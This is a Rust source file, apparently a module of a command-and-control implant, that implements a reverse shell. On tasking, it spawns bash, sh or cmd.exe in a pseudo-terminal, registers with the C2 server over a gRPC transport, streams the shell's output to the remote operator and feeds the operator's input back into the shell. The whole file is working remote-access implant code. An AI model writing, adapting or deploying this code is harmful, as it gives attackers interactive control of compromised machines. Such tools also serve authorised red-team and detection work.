use super::AsyncDispatcher;
use anyhow::Result;
use pb::{
    c2::{ReverseShellMessageKind, ReverseShellRequest, TaskContext},
    config::Config,
};
use portable_pty::{native_pty_system, CommandBuilder, PtySize};
#[cfg(not(target_os = "windows"))]
use std::path::Path;
use tokio::sync::mpsc::error::TryRecvError;
use transport::Transport;

/*
 * ReverseShellPTYMessage will open a reverse shell when dispatched.
 */
#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct ReverseShellPTYMessage {
    pub(crate) id: i64,
    pub(crate) cmd: Option<String>,
}

impl AsyncDispatcher for ReverseShellPTYMessage {
    async fn dispatch(self, transport: &mut impl Transport, _cfg: Config) -> Result<()> {
        let task_id = self.id;

        #[cfg(debug_assertions)]
        log::info!("starting reverse_shell_pty (task_id={})", task_id);

        // Channels to manage gRPC stream
        // Buffer must only be 1
        // gRPC will only send when buffer is over-filled
        let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
        let (input_tx, mut input_rx) = tokio::sync::mpsc::channel(1);
        let (exit_tx, mut exit_rx) = tokio::sync::mpsc::channel(1);

        // First, send an initial registration message
        match output_tx
            .send(ReverseShellRequest {
                context: Some(TaskContext {
                    task_id,
                    jwt: "no_jwt".to_string(),
                }),
                kind: ReverseShellMessageKind::Ping.into(),
                data: Vec::new(),
            })
            .await
        {
            Ok(_) => {}
            Err(_err) => {
                #[cfg(debug_assertions)]
                log::error!("failed to send initial registration message: {}", _err);
            }
        };

        // Use the native pty implementation for the system
        let pty_system = native_pty_system();

        // Create a new pty
        let pair = pty_system.openpty(PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        })?;

        // Spawn command into the pty
        let cmd = match self.cmd {
            Some(cmd) => CommandBuilder::new(cmd),
            None => {
                // Default /bin/bash, fallback to sh if unavailable
                #[cfg(not(target_os = "windows"))]
                if Path::new("/bin/bash").exists() {
                    CommandBuilder::new("/bin/bash")
                } else {
                    CommandBuilder::new("/bin/sh")
                }

                // Default to cmd.exe on Windows
                #[cfg(target_os = "windows")]
                CommandBuilder::new("cmd.exe")
            }
        };

        // Apologies for the exclusionary language in the portable_pty dependency :(
        // We welcome PRs to replace this dependency / wrap it in more inclusive language
        // It would also be great to not spawn a shell as a child process
        let mut child = pair.slave.spawn_command(cmd)?;
        let mut reader = pair.master.try_clone_reader()?;
        let mut writer = pair.master.take_writer()?;

        // Spawn task to send PTY output
        const CHUNK_SIZE: usize = 1024; // 1 KB Limit (/chunk)
        tokio::spawn(async move {
            loop {
                // Read output from the PTY
                let mut buffer = [0; CHUNK_SIZE];
                let n = match reader.read(&mut buffer[..]) {
                    Ok(n) => n,
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("failed to read pty: {}", _err);

                        break;
                    }
                };

                // When no output is read, check if PTY has exited
                if n < 1 {
                    match exit_rx.try_recv() {
                        // Still Running
                        Ok(None) => {}
                        Err(TryRecvError::Empty) => {}

                        // Exited
                        Ok(Some(_status)) => {
                            #[cfg(debug_assertions)]
                            log::info!("closing output stream, pty exited: {}", _status);

                            break;
                        }
                        Err(TryRecvError::Disconnected) => {
                            #[cfg(debug_assertions)]
                            log::info!("closing output stream, exit channel closed");

                            break;
                        }
                    }

                    continue;
                }

                // Send output to gRPC
                match output_tx
                    .send(ReverseShellRequest {
                        context: Some(TaskContext {
                            task_id,
                            jwt: "no_jwt".to_string(),
                        }),
                        kind: ReverseShellMessageKind::Data.into(),
                        data: buffer[..n].to_vec(),
                    })
                    .await
                {
                    Ok(_) => {
                        #[cfg(debug_assertions)]
                        log::debug!("{}", String::from_utf8_lossy(&buffer[..n]));
                    }
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("reverse_shell_pty output failed to queue: {}", _err);

                        break;
                    }
                }

                // Send a ping to force the channel to be flushed
                match output_tx
                    .send(ReverseShellRequest {
                        context: Some(TaskContext {
                            task_id,
                            jwt: "no_jwt".to_string(),
                        }),
                        kind: ReverseShellMessageKind::Ping.into(),
                        data: Vec::new(),
                    })
                    .await
                {
                    Ok(_) => {}
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("reverse_shell_pty ping failed: {}", _err);

                        break;
                    }
                }
            }
        });

        // Initiate gRPC stream
        transport.reverse_shell(output_rx, input_tx).await?;

        // Handle Input
        loop {
            // Exit if the PTY is closed
            if let Ok(Some(_status)) = child.try_wait() {
                #[cfg(debug_assertions)]
                log::info!("closing input stream, pty exited: {}", _status);

                break;
            }

            // Write gRPC input to PTY
            if let Some(msg) = input_rx.recv().await {
                // Skip Pings
                if msg.kind == pb::c2::ReverseShellMessageKind::Ping as i32 {
                    continue;
                }

                // Write Data
                match writer.write_all(&msg.data) {
                    Ok(_) => {}
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("reverse_shell_pty failed to write input: {}", _err);
                    }
                };
            } else {
                // gRPC is closed, time to kill the PTY
                child.kill()?;
                break;
            }
        }

        // Wait for PTY to exit
        let status = child.wait()?;
        exit_tx.send(Some(status)).await?;

        #[cfg(debug_assertions)]
        log::info!("stopping reverse_shell_pty (task_id={})", task_id);

        Ok(())
    }
}

#[cfg(debug_assertions)]
impl PartialEq for ReverseShellPTYMessage {
    fn eq(&self, other: &Self) -> bool {
        self.id == other.id
    }
}
